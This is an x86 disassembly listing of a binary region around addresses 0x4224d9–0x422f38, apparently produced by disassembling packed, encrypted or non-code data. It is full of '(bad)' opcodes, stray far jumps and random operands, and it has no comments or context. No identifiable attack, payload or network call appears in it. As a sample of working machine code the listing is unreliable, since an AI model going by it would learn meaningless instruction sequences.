  4224d9:	pop    ds
  4224da:	loopne 0x4224fa
  4224dc:	and    al,0x35
  4224de:	mov    edi,0x4ddf2066
  4224e3:	adc    BYTE PTR [edi],ah
  4224e5:	dec    ebp
  4224e6:	addr16 pop esp
  4224e8:	mov    fs,WORD PTR [ebx+0x3a4e7dd1]
  4224ee:	aas    
  4224ef:	jp     0x42255d
  4224f1:	pop    eax
  4224f2:	push   esp
  4224f3:	fld    QWORD PTR [edi]
  4224f5:	pop    esp
  4224f6:	iret   
  4224f7:	mov    ebx,0xc4cd867e
  4224fc:	ret    
  4224fd:	cwde   
  4224fe:	(bad)  
  4224ff:	push   DWORD PTR [ebp+eiz*4+0x45]
  422503:	cdq    
  422504:	xor    BYTE PTR [ebx],ah
  422506:	mov    esp,0xb3171e6d
  42250b:	and    al,bh
  42250d:	push   edi
  42250e:	jae    0x42255c
  422510:	(bad)  
  422513:	push   ds
  422514:	adc    DWORD PTR [ecx-0x3902338f],0x608e6c01
  42251e:	into   
  42251f:	mov    esp,0xa9fe26c7
  422524:	lods   eax,DWORD PTR ds:[esi]
  422525:	dec    edi
  422526:	(bad)  
  422527:	cmc    
  422528:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422529:	call   0x427417ac
  42252e:	sub    al,0x43
  422530:	adc    al,0x8e
  422532:	jmp    0x42259f
  422534:	je     0x42259f
  422536:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422537:	hlt    
  422538:	fadd   DWORD PTR [esi]
  42253a:	xchg   esp,eax
  42253b:	daa    
  42253c:	cld    
  42253d:	and    eax,0xe77aaf10
  422542:	inc    edx
  422543:	fxch   st(2)
  422545:	sbb    dl,dh
  422547:	test   DWORD PTR [edx-0x4],esi
  42254a:	out    dx,al
  42254b:	arpl   WORD PTR [ecx+eiz*1],bx
  42254e:	xchg   edi,eax
  42254f:	xchg   edi,eax
  422550:	cmp    eax,0x5bc98bd7
  422555:	xor    dh,BYTE PTR [ebp+0x2189a59e]
  42255b:	(bad)  
  42255c:	bound  esi,QWORD PTR [bx+di]
  42255f:	or     eax,0x70d757c
  422564:	pop    edx
  422565:	or     DWORD PTR [esi],eax
  422567:	aaa    
  422568:	iret   
  422569:	arpl   bx,si
  42256b:	mov    edx,0x88f12f08
  422570:	inc    edx
  422571:	sbb    bh,ch
  422573:	and    bh,BYTE PTR ds:0x979b2c97
  422579:	test   DWORD PTR [ecx+edi*2],0xb20972d7
  422580:	sub    bl,0xb5
  422583:	mov    ah,0xae
  422585:	(bad)  
  422586:	mov    eax,0xe8b4051
  42258b:	cdq    
  42258c:	add    BYTE PTR [edi],cl
  42258e:	icebp  
  42258f:	mov    al,ds:0x0
	...
  4225f4:	call   0xfa77:0xbf778fae
  4225fb:	out    dx,eax
  4225fc:	sbb    esi,DWORD PTR [ecx-0x723c5d08]
  422602:	fwait
  422603:	dec    edi
  422604:	inc    esp
  422605:	outs   dx,BYTE PTR ds:[esi]
  422606:	add    DWORD PTR [eax],eax
  422608:	add    al,0x1
  42260a:	add    BYTE PTR [eax],al
  42260c:	outs   dx,DWORD PTR ds:[esi]
  42260d:	push   cs
  42260e:	push   edi
  42260f:	jg     0x422648
  422611:	adc    dh,ch
  422613:	pop    ebp
  422614:	repnz mov bh,0x59
  422617:	push   ebx
  422618:	and    eax,DWORD PTR [edi-0x10]
  42261b:	enter  0xb8b5,0xc3
  42261f:	iret   
  422620:	test   BYTE PTR [ecx-0x3e],0xb6
  422624:	ds call 0x3d7e:0x5e66730d
  42262c:	or     edx,DWORD PTR [eax]
  42262e:	ins    BYTE PTR es:[edi],dx
  42262f:	clc    
  422630:	test   BYTE PTR [edx],bl
  422632:	in     al,dx
  422633:	cmp    DWORD PTR [ebx+0x7c],ebx
  422636:	push   esi
  422637:	add    eax,0x9767706c
  42263c:	push   ds
  42263d:	hlt    
  42263e:	mul    edi
  422640:	scas   al,BYTE PTR es:[edi]
  422641:	je     0x42261a
  422643:	mov    edx,0x33340d68
  422648:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422649:	leave  
  42264a:	inc    esp
  42264b:	adc    eax,DWORD PTR [ebx]
  42264d:	outs   dx,BYTE PTR ds:[esi]
  42264e:	nop    DWORD PTR ss:[ebp-0x47155e79]
  422656:	and    eax,0xbd31c77b
  42265b:	jmp    0x4226c5
  42265d:	pop    es
  42265e:	and    edx,DWORD PTR [ebp-0x65e2616a]
  422664:	adc    esi,esi
  422666:	or     eax,DWORD PTR [esi]
  422668:	jmp    0x4225fb
  42266a:	mov    edx,0x359e2339
  42266f:	sahf   
  422670:	(bad)  
  422671:	lods   eax,DWORD PTR ds:[esi]
  422672:	mov    ch,0x7f
  422674:	lods   al,BYTE PTR ds:[esi]
  422675:	in     eax,0xfe
  422677:	mov    dh,0x49
  422679:	pop    edx
  42267a:	in     al,0xfb
  42267c:	fdiv   st,st(7)
  42267e:	jl     0x422678
  422680:	ficomp DWORD PTR [ecx+0x52354d76]
  422686:	dec    ebx
  422687:	cmp    eax,DWORD PTR ds:0x48840368
  42268d:	add    ax,0xcb00
  422691:	push   0x7e
  422693:	ja     0x4226ab
  422695:	push   edx
  422696:	popa   
  422697:	ss jno 0x4226db
  42269a:	in     eax,0x9d
  42269c:	imul   ebx,DWORD PTR [ecx+ebp*1-0x40],0xc7a2c3e0
  4226a4:	imul   ebp,edx,0x1d
  4226a7:	pop    esi
  4226a8:	lods   al,BYTE PTR ds:[esi]
  4226a9:	enter  0xc3e1,0x9e
  4226ad:	and    dl,ch
  4226af:	int    0xf
  4226b1:	or     ecx,DWORD PTR [edi-0x2e]
  4226b4:	sbb    DWORD PTR [ecx+0x5a],edi
  4226b7:	push   esp
  4226b8:	sbb    ah,BYTE PTR ds:0xe9fdd160
  4226be:	and    BYTE PTR [edx+0x72],bh
  4226c1:	dec    esi
  4226c2:	jg     0x4226f0
  4226c4:	(bad)  
  4226c6:	jbe    0x422648
  4226c8:	nop
  4226c9:	dec    ebx
  4226ca:	mov    esp,DWORD PTR [edi+ebx*2+0x76fe4d2e]
  4226d1:	cdq    
  4226d2:	adc    eax,0xd3fab285
  4226d7:	fild   WORD PTR [ecx+0x3496c4fc]
  4226dd:	sti    
  4226de:	push   cs
  4226df:	pop    esp
  4226e0:	arpl   WORD PTR [ebx],sp
  4226e2:	sbb    eax,0xff52083e
  4226e7:	adc    al,0xdf
  4226e9:	xchg   ebp,eax
  4226ea:	aad    0x5f
  4226ec:	mov    WORD PTR [eax-0x7e],cs
  4226ef:	arpl   WORD PTR [edi-0x23d12873],bp
  4226f5:	push   eax
  4226f6:	add    al,BYTE PTR [ecx-0x6a]
  4226f9:	jns    0x422770
  4226fb:	cmc    
  4226fc:	aas    
  4226fd:	xor    bh,dl
  4226ff:	cmp    DWORD PTR [ecx-0xcbe186b],ebp
  422705:	dec    esp
  422706:	push   edx
  422707:	pop    esi
  422708:	mov    edx,0x580e2d31
  42270d:	inc    ebx
  42270e:	aaa    
  42270f:	inc    ebp
	...
  422774:	daa    
  422775:	sub    eax,0x7d7f2d7d
  42277a:	ja     0x4227ab
  42277c:	mov    esi,0x1e7f01c8
  422781:	jmp    0x1:0x6f4853b8
  422788:	add    al,0x1
  42278a:	add    BYTE PTR [eax],al
  42278c:	jge    0x4227cc
  42278e:	inc    edi
  42278f:	lahf   
  422790:	cli    
  422791:	add    eax,0x8b19f669
  422796:	jmp    edx
  422798:	sar    BYTE PTR [ebx-0x9],1
  42279b:	adc    eax,0xa041cbff
  4227a0:	(bad)  
  4227a1:	push   edx
  4227a2:	fnsave [ecx+0x76bebbf5]
  4227a8:	pop    ds
  4227a9:	leave  
  4227aa:	push   esp
  4227ab:	lods   eax,DWORD PTR ds:[esi]
  4227ac:	pop    esi
  4227ad:	mov    edx,0xb2ffa19c
  4227b2:	nop
  4227b3:	xchg   esp,eax
  4227b4:	cmp    al,0xb6
  4227b6:	dec    esi
  4227b7:	push   ebp
  4227b8:	push   esp
  4227b9:	adc    al,0xb4
  4227bb:	mov    ch,0x23
  4227bd:	not    edi
  4227bf:	xor    ebp,DWORD PTR [edx+0x48d7dd4d]
  4227c5:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4227c7:	pop    es
  4227c8:	iret   
  4227c9:	push   0xffffffce
  4227cb:	ins    BYTE PTR es:[edi],dx
  4227cc:	nop
  4227cd:	ror    DWORD PTR [edx-0x65],cl
  4227d0:	pop    ds
  4227d1:	mov    ebp,0x93f3e6ca
  4227d6:	pop    edi
  4227d7:	scas   al,BYTE PTR es:[edi]
  4227d8:	adc    BYTE PTR [eax-0x9579117],cl
  4227de:	nop
  4227df:	mov    edi,0xc9311fd0
  4227e4:	xchg   ebx,eax
  4227e5:	(bad)  
  4227e6:	addr16 mov eax,0xbd2e7100
  4227ec:	test   eax,0x52a133cd
  4227f1:	pop    edx
  4227f2:	cmp    DWORD PTR [edi+0x3ee98878],ebx
  4227f8:	js     0x422838
  4227fa:	xchg   BYTE PTR [edi],bl
  4227fc:	outs   dx,BYTE PTR ds:[esi]
  4227fd:	ret    
  4227fe:	sub    BYTE PTR [eax+0x181eb40],bh
  422804:	in     eax,dx
  422805:	jmp    0x4227a2
  422807:	in     al,0x7a
  422809:	push   ds
  42280a:	retf   0xa920
  42280d:	add    eax,0xdda6293
  422812:	add    al,0x2c
  422814:	dec    eax
  422815:	mov    edi,0xa47e8105
  42281a:	dec    eax
  42281b:	loopne 0x42286a
  42281d:	jge    0x4227ad
  42281f:	mov    WORD PTR [ecx+0x69b516fd],cs
  422825:	xor    eax,0x36d9ac4
  42282a:	test   eax,0xa080cac
  42282f:	in     al,0xda
  422831:	add    al,BYTE PTR [ebp+0x7bb062f6]
  422837:	sbb    ch,BYTE PTR [ebp-0x47]
  42283a:	or     bh,BYTE PTR [ebx+0x554e8bdb]
  422840:	imul   ebx,eax,0xffffff99
  422843:	mov    ch,0x3c
  422845:	jae    0x4227de
  422847:	sbb    al,0x91
  422849:	or     DWORD PTR [eax-0x3],edx
  42284c:	loopne 0x4228c1
  42284e:	pop    ebx
  42284f:	cs xchg esi,eax
  422851:	lock sub bl,0x89
  422855:	jae    0x42282d
  422857:	jb     0x42281b
  422859:	push   edx
  42285a:	fld    TBYTE PTR [edi]
  42285c:	stos   DWORD PTR es:[edi],eax
  42285d:	push   edx
  42285e:	mov    bh,0x51
  422860:	xchg   edx,eax
  422861:	push   ecx
  422862:	std    
  422863:	and    DWORD PTR [ebx+esi*8-0x51],eax
  422867:	test   eax,0xb21733c3
  42286c:	or     edx,DWORD PTR [edi+0x747d5f34]
  422872:	bound  eax,QWORD PTR [ecx-0x43a2f1c6]
  422878:	in     eax,dx
  422879:	mov    WORD PTR [ecx-0x44],?
  42287c:	sbb    cl,BYTE PTR [ebp-0x37]
  42287f:	gs mov eax,0x5a07d1ea
  422885:	mov    edi,0xc950ca12
  42288a:	mov    edx,0xfead1bd4
  42288f:	mov    al,BYTE PTR [eax]
	...
  4228f1:	add    BYTE PTR [eax],al
  4228f3:	add    ch,cl
  4228f5:	cmp    DWORD PTR [eax-0x10680369],edi
  4228fb:	jnp    0x4228bb
  4228fd:	outs   dx,DWORD PTR ds:[esi]
  4228fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228ff:	loopne 0x422978
  422901:	inc    edi
  422902:	jmp    0x400:0x1704c87
  422909:	add    DWORD PTR [eax],eax
  42290b:	add    BYTE PTR [ecx],cl
  42290d:	add    cl,BYTE PTR [esi-0x38416a9e]
  422913:	daa    
  422914:	cmp    ah,dh
  422916:	lock inc edx
  422918:	adc    eax,0x2b9cfd38
  42291d:	cmp    dl,0x0
  422920:	jmp    0x2ad55409
  422925:	jae    0x42295b
  422927:	add    al,0x4d
  422929:	sub    DWORD PTR [edi],0xffffffda
  42292c:	popa   
  42292d:	and    eax,DWORD PTR [edx+0x4c]
  422930:	call   0x8b29:0x3f86cbef
  422937:	ret    0x37b8
  42293a:	xchg   esp,eax
  42293b:	bound  ebx,QWORD PTR [esi]
  42293d:	adc    ebx,DWORD PTR [esp+eiz*2-0x48]
  422941:	mov    edi,0x60d8f2e0
  422946:	dec    ebx
  422947:	fsub   QWORD PTR [eax+edi*4+0x6de21e70]
  42294e:	scas   al,BYTE PTR es:[edi]
  42294f:	lock pop ds
  422951:	mov    ecx,0x8dbf05b1
  422956:	aas    
  422957:	xor    eax,0xb03679af
  42295c:	loopne 0x422990
  42295e:	xchg   edi,eax
  42295f:	cli    
  422960:	adc    BYTE PTR [edx+0x6b],cl
  422963:	retf   
  422964:	in     al,0x73
  422966:	mov    esp,0xa6836b87
  42296b:	(bad)  
  42296c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42296d:	inc    ebp
  42296e:	popf   
  42296f:	adc    ebp,esi
  422971:	shl    DWORD PTR [ecx],0x13
  422974:	(bad)  [esi-0x5ed4f9f3]
  42297a:	fbstp  TBYTE PTR [eax-0x36a9b2b]
  422980:	dec    esi
  422981:	jecxz  0x4229d0
  422983:	aaa    
  422984:	outs   dx,BYTE PTR ds:[esi]
  422985:	out    dx,eax
  422986:	mov    ds:0xebaa5efc,eax
  42298b:	jg     0x422952
  42298d:	adc    al,BYTE PTR [ecx]
  42298f:	aaa    
  422990:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422991:	repz jecxz 0x422951
  422994:	cmp    dh,bh
  422996:	sbb    al,0xa5
  422998:	mov    ah,0x65
  42299a:	mov    BYTE PTR [ebx-0x469236e2],al
  4229a0:	xor    DWORD PTR [ebp+0x5f],0xffffffe8
  4229a4:	das    
  4229a5:	das    
  4229a6:	add    al,0xed
  4229a8:	mov    ah,0x7a
  4229aa:	sbb    cl,ah
  4229ac:	sub    al,0x29
  4229ae:	inc    ebp
  4229af:	cmp    ebp,DWORD PTR [edx+0x4]
  4229b2:	cli    
  4229b3:	scas   al,BYTE PTR es:[edi]
  4229b4:	mov    cl,BYTE PTR [esi+eax*2+0x78]
  4229b8:	std    
  4229b9:	xor    DWORD PTR [edx+0x0],edi
  4229bc:	pusha  
  4229bd:	imul   esi,DWORD PTR [eax-0x7106e63f],0xffffff88
  4229c4:	dec    ebx
  4229c5:	jle    0x4229cc
  4229c7:	inc    ecx
  4229c8:	cmp    edi,DWORD PTR [edx+esi*8+0x6bf2899b]
  4229cf:	mov    ch,0x62
  4229d1:	cli    
  4229d2:	or     BYTE PTR [ebx-0xf],0x99
  4229d6:	push   esp
  4229d7:	xor    ch,dh
  4229d9:	sti    
  4229da:	mov    ds:0x89699590,eax
  4229df:	xchg   ebx,eax
  4229e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4229e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229e2:	mov    ch,0xa0
  4229e4:	push   ebp
  4229e5:	pop    ds
  4229e6:	addr16 pop eax
  4229e8:	or     eax,0x7485fea0
  4229ed:	push   ss
  4229ee:	in     al,0x28
  4229f0:	adc    DWORD PTR [edx-0x21],ecx
  4229f3:	mov    edx,0x5a764185
  4229f8:	fs std 
  4229fa:	pop    esi
  4229fb:	and    BYTE PTR [ebp+0x3b869712],al
  422a01:	inc    eax
  422a02:	call   0xcbecbee7
  422a07:	xchg   BYTE PTR [edx],ch
  422a09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a0a:	in     al,dx
  422a0b:	nop
  422a0c:	mov    ds:0x7c8c1c,al
	...
  422a71:	add    BYTE PTR [eax],al
  422a73:	add    BYTE PTR [esi-0x377e796],dl
  422a79:	cli    
  422a7a:	xchg   esi,eax
  422a7b:	jle    0x422a4e
  422a7d:	push   esp
  422a7e:	je     0x422a3d
  422a80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a81:	add    eax,0x71505856
  422a86:	add    DWORD PTR [eax],eax
  422a88:	add    al,0x1
  422a8a:	add    BYTE PTR [eax],al
  422a8c:	stos   BYTE PTR es:[edi],al
  422a8d:	mov    ds:0xb5eb4ec9,al
  422a92:	pusha  
  422a93:	and    ch,bh
  422a95:	les    esp,FWORD PTR [edi]
  422a97:	loopne 0x422acc
  422a99:	sbb    eax,0x3e5cb65e
  422a9e:	mov    ch,0x58
  422aa0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422aa1:	or     DWORD PTR [ecx-0x485ab76b],esi
  422aa7:	push   edx
  422aa8:	pop    edi
  422aa9:	pop    edi
  422aaa:	aas    
  422aab:	mov    ah,0xbd
  422aad:	xor    eax,0x7aa49eb6
  422ab2:	ret    
  422ab3:	scas   eax,DWORD PTR es:[edi]
  422ab4:	outs   dx,BYTE PTR ds:[esi]
  422ab5:	daa    
  422ab6:	sub    al,0xfb
  422ab8:	aaa    
  422ab9:	sub    al,0x79
  422abb:	inc    ecx
  422abc:	nop
  422abd:	push   ds
  422abe:	and    BYTE PTR [edi+0x15ca26f5],ah
  422ac4:	xor    eax,DWORD PTR [eax+0x6b]
  422ac7:	(bad)  
  422ac8:	cmp    DWORD PTR [ecx-0x21],esp
  422acb:	push   esi
  422acc:	cmp    esp,esi
  422ace:	out    0xaa,al
  422ad0:	mov    ds:0xd57e3c35,al
  422ad5:	outs   dx,DWORD PTR gs:[esi]
  422ad7:	out    dx,eax
  422ad8:	xor    ah,BYTE PTR [esi]
  422ada:	jg     0x422b11
  422adc:	and    eax,0x5aac7857
  422ae1:	add    ebx,DWORD PTR [ebx]
  422ae3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ae4:	fisub  WORD PTR [ebx]
  422ae6:	test   eax,edx
  422ae8:	xor    edi,DWORD PTR [eax-0x2d]
  422aeb:	pusha  
  422aec:	adc    DWORD PTR [ebx+0x4e],esp
  422aef:	sbb    edi,esi
  422af1:	mov    esp,esi
  422af3:	push   eax
  422af4:	addr16 mov ds:0xf520,al
  422af8:	push   edx
  422af9:	push   ecx
  422afa:	mov    edx,0x7d297abd
  422aff:	jmp    0x4883:0x24847ce1
  422b06:	(bad)  
  422b08:	lock test al,0x97
  422b0b:	or     al,0xaa
  422b0d:	pop    ebx
  422b0e:	push   cs
  422b0f:	sub    al,BYTE PTR [ebp+0x4b9ca042]
  422b15:	and    eax,esi
  422b17:	in     al,dx
  422b18:	arpl   WORD PTR [edi+edx*4+0x1a],sp
  422b1c:	push   esp
  422b1d:	push   esp
  422b1e:	push   es
  422b1f:	mov    DWORD PTR [edi+0x20],ebx
  422b22:	cmp    al,0x72
  422b24:	jae    0x422b93
  422b26:	jbe    0x422b06
  422b28:	push   cs
  422b29:	(bad)  
  422b2a:	fldenv [esi]
  422b2c:	inc    eax
  422b2d:	jae    0x422b7b
  422b2f:	jp     0x422ba0
  422b31:	sbb    dh,BYTE PTR [eax+ebx*2-0x5ef6f65c]
  422b38:	push   esp
  422b39:	xor    DWORD PTR [ecx-0x61],esp
  422b3c:	sub    eax,eax
  422b3e:	out    0xfd,eax
  422b40:	hlt    
  422b41:	fs clc 
  422b43:	push   ss
  422b44:	mov    ah,0xb6
  422b46:	jmp    0x422b2b
  422b48:	mov    edx,0xd2de096a
  422b4d:	xchg   esp,eax
  422b4e:	xor    bh,ch
  422b50:	hlt    
  422b51:	mov    esp,0x9b963b30
  422b56:	mov    dl,BYTE PTR [ebx+edi*1]
  422b59:	outs   dx,BYTE PTR ds:[esi]
  422b5a:	dec    ecx
  422b5b:	test   DWORD PTR [ebp+edi*1-0x274b9a5],0xeaf8d1f9
  422b66:	push   ds
  422b67:	ficomp WORD PTR [esi-0x7c]
  422b6a:	push   edi
  422b6b:	call   0x5b822656
  422b70:	sbb    BYTE PTR [ecx+edx*1+0x0],bh
  422b74:	or     al,0x9b
  422b76:	push   0x379a199e
  422b7b:	std    
  422b7c:	cmp    eax,0xa7ab9404
  422b81:	sti    
  422b82:	(bad)  
  422b83:	pop    edx
  422b84:	arpl   WORD PTR [ebx-0x51d693aa],di
  422b8a:	inc    edi
  422b8b:	mov    al,ss:0xebcafa
	...
  422bf1:	add    BYTE PTR [eax],al
  422bf3:	add    BYTE PTR [edi+esi*1+0x4a],al
  422bf7:	fwait
  422bf8:	jnp    0x422bf9
  422bfa:	aad    0xff
  422bfc:	sbb    dl,BYTE PTR [edx-0x247bb264]
  422c02:	push   edx
  422c03:	ja     0x422c59
  422c05:	jb     0x422c08
  422c07:	add    BYTE PTR [ecx+eax*1],al
  422c0a:	add    BYTE PTR [eax],al
  422c0c:	enter  0x7b6a,0x24
  422c10:	pop    ecx
  422c11:	pop    eax
  422c12:	and    BYTE PTR [edx],dl
  422c14:	lds    ecx,FWORD PTR [edx-0x5e2eb39f]
  422c1a:	dec    ebx
  422c1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c1c:	xchg   ebx,eax
  422c1d:	and    edx,ebx
  422c1f:	test   al,0x87
  422c21:	ret    
  422c22:	mov    eax,ds:0xfd2507b1
  422c27:	dec    ebp
  422c28:	mov    esp,0x690d912a
  422c2d:	xor    eax,0x80d166e6
  422c32:	dec    edx
  422c33:	js     0x422c81
  422c35:	int    0x3b
  422c37:	scas   al,BYTE PTR es:[edi]
  422c38:	push   edx
  422c39:	jg     0x422bde
  422c3b:	imul   edi,DWORD PTR [ebx-0x1c],0xffffff94
  422c3f:	xor    DWORD PTR [esi+ecx*1+0x68],edx
  422c43:	adc    cl,cl
  422c45:	aaa    
  422c46:	or     BYTE PTR [esi-0x31],dl
  422c49:	or     ecx,DWORD PTR [ebp-0x25c8b72f]
  422c4f:	das    
  422c50:	mov    dh,0xeb
  422c52:	sub    DWORD PTR [edi-0x1b],ebx
  422c55:	and    ecx,DWORD PTR ds:0xd70f065
  422c5b:	loopne 0x422c1f
  422c5d:	iret   
  422c5e:	mov    esi,0x2faf5e23
  422c63:	nop
  422c64:	xor    eax,esp
  422c66:	adc    al,0xe7
  422c68:	mov    ah,0x80
  422c6a:	add    eax,0x4b0b395d
  422c6f:	adc    DWORD PTR [esi+eiz*1],ebx
  422c72:	add    edx,DWORD PTR [ecx]
  422c74:	repz ret 
  422c76:	in     eax,0xee
  422c78:	fidivr WORD PTR [edx]
  422c7a:	dec    eax
  422c7b:	das    
  422c7c:	scas   al,BYTE PTR es:[edi]
  422c7d:	and    al,0xa6
  422c7f:	sub    ah,BYTE PTR [ebp+0xb94951f]
  422c85:	push   edi
  422c86:	sub    eax,0xcd147144
  422c8b:	cdq    
  422c8c:	sbb    al,0xf0
  422c8e:	push   ds
  422c8f:	cmp    DWORD PTR [ebp-0x8fd4324],ebx
  422c95:	les    ecx,FWORD PTR [ebp+0x19]
  422c98:	mov    cl,0x96
  422c9a:	in     eax,0x5f
  422c9c:	sub    eax,DWORD PTR [ecx-0x8]
  422c9f:	shr    DWORD PTR ds:0x3ff1979,0x56
  422ca6:	icebp  
  422ca7:	pop    es
  422ca8:	fadd   st(7),st
  422caa:	mov    BYTE PTR [eax-0x5a2050ae],dl
  422cb0:	jns    0x422c40
  422cb2:	out    dx,eax
  422cb3:	shld   DWORD PTR [ebx-0x50],edi,cl
  422cb7:	aas    
  422cb8:	jmp    0x422d0a
  422cba:	rcr    BYTE PTR [ecx+0x41404174],cl
  422cc0:	mov    ch,0x3d
  422cc2:	clc    
  422cc3:	enter  0xd4a6,0x77
  422cc7:	js     0x422c49
  422cc9:	dec    ebp
  422cca:	pusha  
  422ccb:	je     0x422cb4
  422ccd:	(bad)
  422cd0:	add    BYTE PTR [edi+0x74],dl
  422cd3:	je     0x422d13
  422cd5:	fistp  DWORD PTR [edi+edx*8-0x4746f46b]
  422cdc:	push   edi
  422cdd:	push   0xcb0d7f23
  422ce2:	jne    0x422d41
  422ce4:	sub    BYTE PTR [ecx+ebx*4],dh
  422ce7:	jbe    0x422ce2
  422ce9:	sti    
  422cea:	ret    
  422ceb:	cmp    al,0x17
  422ced:	mov    esi,0xec34b2bf
  422cf2:	inc    ebx
  422cf3:	inc    ecx
  422cf4:	sub    eax,ebp
  422cf6:	jg     0x422d38
  422cf8:	cmp    DWORD PTR [esi],0x1e
  422cfb:	fs sti 
  422cfd:	je     0x422d15
  422cff:	xor    ebp,0x52
  422d02:	jecxz  0x422cce
  422d04:	jno    0x422cd8
  422d06:	pop    eax
  422d07:	push   eax
  422d08:	and    DWORD PTR [eax-0x2d1c2cce],esp
  422d0e:	mov    al,ds:0x3
	...
  422d73:	add    BYTE PTR [edi+0x626d60bd],bh
  422d79:	std    
  422d7a:	mov    edi,0x80797fff
  422d7f:	sub    esp,DWORD PTR [eax+0x58661192]
  422d85:	jae    0x422d88
  422d87:	add    BYTE PTR [ecx+eax*1],al
  422d8a:	add    BYTE PTR [eax],al
  422d8c:	jnp    0x422da0
  422d8e:	or     edx,edx
  422d90:	lock inc esp
  422d92:	outs   dx,DWORD PTR ds:[esi]
  422d93:	fdivr  DWORD PTR [edi+ebp*4]
  422d96:	cmp    cl,BYTE PTR [ecx]
  422d98:	addr16 sub cl,ah
  422d9b:	(bad)  
  422d9d:	(bad)  
  422d9e:	or     al,0x82
  422da0:	lea    eax,[esi+0x28]
  422da3:	push   0xffffffe1
  422da5:	pop    ds
  422da6:	push   ebx
  422da7:	mov    esi,0x53790732
  422dac:	nop
  422dad:	sub    DWORD PTR [edx-0x6da28c4b],ecx
  422db3:	push   eax
  422db4:	popf   
  422db5:	adc    al,0x40
  422db7:	sbb    BYTE PTR [esi+0x57],ch
  422dba:	cwde   
  422dbb:	pop    ecx
  422dbc:	aaa    
  422dbd:	xchg   edi,eax
  422dbe:	addr16 inc esi
  422dc0:	xchg   ecx,eax
  422dc1:	jg     0x422d63
  422dc3:	int3   
  422dc4:	xor    al,cl
  422dc6:	outs   dx,BYTE PTR ds:[esi]
  422dc7:	into   
  422dc8:	jno    0x422da7
  422dca:	xchg   ecx,eax
  422dcb:	(bad)  
  422dcc:	cmc    
  422dcd:	in     al,0x99
  422dcf:	loopne 0x422e1e
  422dd1:	dec    esp
  422dd2:	sub    ecx,DWORD PTR ds:0xf8aae38b
  422dd8:	repnz pop ebx
  422dda:	and    eax,ebx
  422ddc:	cdq    
  422ddd:	rcl    BYTE PTR [edi+0x1b],0xba
  422de1:	inc    edx
  422de2:	mov    ebp,0x54385a6d
  422de7:	sar    esi,1
  422de9:	cdq    
  422dea:	dec    ebx
  422deb:	dec    esp
  422dec:	daa    
  422ded:	jns    0x422e2f
  422def:	pop    edx
  422df0:	sbb    ah,bh
  422df2:	clc    
  422df3:	stos   BYTE PTR es:[edi],al
  422df4:	mov    ah,BYTE PTR [ebp-0x21]
  422df7:	xchg   esi,eax
  422df8:	addr16 cmp al,0xfb
  422dfb:	pop    ecx
  422dfc:	and    bh,BYTE PTR [ebp-0xb6dd9f4]
  422e02:	sbb    al,ch
  422e04:	rol    DWORD PTR [eax-0x249a1231],1
  422e0a:	jmp    0x7bd5:0x2974c44c
  422e11:	ja     0x422e00
  422e13:	pop    esi
  422e14:	aad    0x39
  422e16:	sub    DWORD PTR [ebx+esi*4-0x53870b0],ebx
  422e1d:	and    DWORD PTR [esi],ebp
  422e1f:	and    al,BYTE PTR [ebx+0x40]
  422e22:	push   ebx
  422e23:	mov    ebp,0xcbe0665e
  422e28:	cmp    BYTE PTR ds:0xd1a1f82,cl
  422e2e:	sbb    al,0xcc
  422e30:	fldcw  WORD PTR [edi+0x34]
  422e33:	xor    bh,cl
  422e35:	jmp    0x998e:0x32bbd2b9
  422e3c:	cmp    ebx,esp
  422e3e:	into   
  422e3f:	pop    ecx
  422e40:	jnp    0x422e5a
  422e42:	nop
  422e43:	mov    dl,bl
  422e45:	mov    ah,0xab
  422e47:	push   ds
  422e48:	mov    WORD PTR [edi],?
  422e4a:	popa   
  422e4b:	std    
  422e4c:	xchg   esi,eax
  422e4d:	mov    es,WORD PTR [ecx]
  422e4f:	xlat   BYTE PTR ds:[ebx]
  422e50:	fadd   QWORD PTR [ecx-0x4e65b164]
  422e56:	push   ebp
  422e57:	mov    ah,0xd0
  422e59:	mov    ah,0xdb
  422e5b:	in     al,dx
  422e5c:	retf   
  422e5d:	ja     0x422e0b
  422e5f:	xchg   esp,eax
  422e60:	mov    eax,0x43bd2aeb
  422e65:	pop    edi
  422e66:	test   BYTE PTR [ebp-0x6d1a5eee],0x9a
  422e6d:	jae    0x422e9a
  422e6f:	and    esi,DWORD PTR [edi+0x7b]
  422e72:	jmp    0x20b0:0xff445826
  422e79:	cld    
  422e7a:	mov    dh,0x79
  422e7c:	sbb    al,0x64
  422e7e:	je     0x422e19
  422e80:	fnstsw WORD PTR [edx+ebp*8]
  422e83:	dec    ebx
  422e84:	fs dec ebx
  422e86:	push   ds
  422e87:	adc    eax,0x4128236e
  422e8c:	dec    esi
  422e8d:	int3   
  422e8e:	iret   
  422e8f:	fiadd  WORD PTR [eax]
	...
  422ef1:	add    BYTE PTR [eax],al
  422ef3:	add    BYTE PTR [ebx-0x21e677ab],al
  422ef9:	fst    QWORD PTR [ebx+0x33b808df]
  422eff:	retf   0xe5ba
  422f02:	jp     0x422f4a
  422f04:	pop    esp
  422f05:	je     0x422f08
  422f07:	add    BYTE PTR [ecx+eax*1],al
  422f0a:	add    BYTE PTR [eax],al
  422f0c:	xchg   esp,eax
  422f0d:	data16 jae 0x422eee
  422f10:	and    bh,BYTE PTR [edx+0x38]
  422f13:	test   ebp,ebx
  422f15:	imul   edx,DWORD PTR [eax],0x49
  422f18:	in     eax,dx
  422f19:	and    eax,0x29401a86
  422f1e:	ror    BYTE PTR [eax+0x5f740bf3],cl
  422f24:	mov    eax,0x24ea1c79
  422f29:	or     eax,0x78820278
  422f2e:	adc    edi,DWORD PTR [esi]
  422f30:	shr    al,cl
  422f32:	add    eax,0xfb19c4b4
  422f37:	pop    esi
  422f38:	test   DWORD PTR [esi+0x75389d8d],eax
